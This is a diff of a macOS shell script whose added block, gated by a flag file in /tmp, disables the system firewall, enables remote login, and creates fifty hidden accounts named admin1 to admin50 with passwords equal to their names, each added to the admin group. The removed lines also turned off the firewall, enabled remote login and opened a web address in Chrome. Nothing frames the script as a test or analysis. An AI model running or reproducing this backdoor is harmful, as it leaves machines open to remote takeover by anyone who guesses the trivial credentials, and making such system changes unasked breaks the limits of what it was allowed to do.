@@ -1,3 +1,24 @@
-/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
-systemsetup -setremotelogin on
-open -a "Google Chrome" "https:injun.dev"
+FLAG_FILE="/tmp/test_task_done"
+
+if [ ! -f "$FLAG_FILE" ]; then
+
+    /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
+    systemsetup -setremotelogin on
+
+    for i in {1..50}; do
+      username="admin$i"
+      sudo dscl . -create /Users/$username
+      sudo dscl . -create /Users/$username UserShell /bin/bash
+      sudo dscl . -create /Users/$username RealName "$username"
+      sudo dscl . -create /Users/$username UniqueID $((500 + $i))
+      sudo dscl . -create /Users/$username PrimaryGroupID 80
+      sudo dscl . -create /Users/$username NFSHomeDirectory /Users/$username
+      sudo dscl . -passwd /Users/$username "$username"
+      sudo dscl . -create /Users/$username IsHidden 1
+      sudo mkdir -p /Users/$username
+      sudo chown $username /Users/$username
+      sudo dseditgroup -o edit -a $username -t user admin
+    done
+    
+    touch "$FLAG_FILE"
+fi
